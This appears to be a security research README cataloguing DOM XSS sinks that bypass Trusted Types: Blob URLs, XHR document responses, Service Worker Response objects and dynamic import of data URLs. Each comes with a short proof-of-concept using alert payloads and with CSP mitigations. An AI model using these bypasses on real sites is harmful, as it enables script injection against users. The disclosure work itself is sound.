# Cursed Types

This repo contains list of DOM-based XSS sinks which are not subject to [Trusted Types](https://web.dev/trusted-types/) checks. Contributions welcome! 😊

## Blob URL

Trusted Types enforced on a document will be inherited to Blob URL when navigating to Blob URL. However, resulting document of the Blob URL contains stored XSS payload, and therefore it bypasses Trusted Types check.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/blob_url.html):
```
let attackerControlledString = '<img src=x onerror=alert(origin)>';
const blob = new Blob([attackerControlledString], {type: 'text/html'});
const url = URL.createObjectURL(blob);
location.href = url;
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
- There is a discussion to provide an option for creating a [secure Blob URL](https://github.com/w3c/FileAPI/issues/74).

## XHR document response

XMLHttpRequest (XHR) supports [`document` response type](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest), which returns parsed document of XHR response instead of text.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/xhr_document.html):
```
let attackerControlledString = 'data:text/html,<img id=content src=x onerror=alert(origin)>';
const xhr = new XMLHttpRequest();
xhr.onload = function() {
  document.body.appendChild(this.response.querySelector('#content'));
}

xhr.open("GET", attackerControlledString);
// The following changes response type from text to parsed document.
xhr.responseType = "document";
xhr.send();
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
- Only allow trusted endpoints in [CSP connect-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src).

## Response API

[Response API](https://developer.mozilla.org/en-US/docs/Web/API/Response/Response) can be used in several places to serve a response of a request through Service Worker. If the Response is generated from user input, this could result in Trusted Types bypasses.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/service_worker_response.html):
```
self.addEventListener('fetch', event => {
  const params = new URLSearchParams(event.request.url.split('?')[1]);
  let attackerControlledString = params.get('attackerControlledString');
  
  if (attackerControlledString) {
    init = {
      headers: {
        'Content-Type': 'text/html',
        'Content-Security-Policy': "require-trusted-types-for 'script'; trusted-types 'none';"
          
      }
    };
    event.respondWith(new Response(attackerControlledString, init));
  }
});
```

```
// Assuming legit service worker returns cached content.
caches.open("v1").then(cache => {
  let attackerControlledString = '<img src=x onerror=alert(origin)>';
  init = {
    headers: {
      'Content-Type': 'text/html',
      'Content-Security-Policy': "require-trusted-types-for 'script'; trusted-types 'none';"

    }
  };
  cache.put('xss', new Response(attackerControlledString, init));
})
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).

## Non-DOM API based script loading

[Non-DOM API based script loading](https://github.com/w3c/webappsec-trusted-types/issues/232) currently bypasses Trusted Types.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/script_loading.html):
```
let attackerControlledString = 'data:application/javascript,alert(origin)';
import(attackerControlledString);
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp) + serve allow-list of script endpoints in another `script-src` directive.
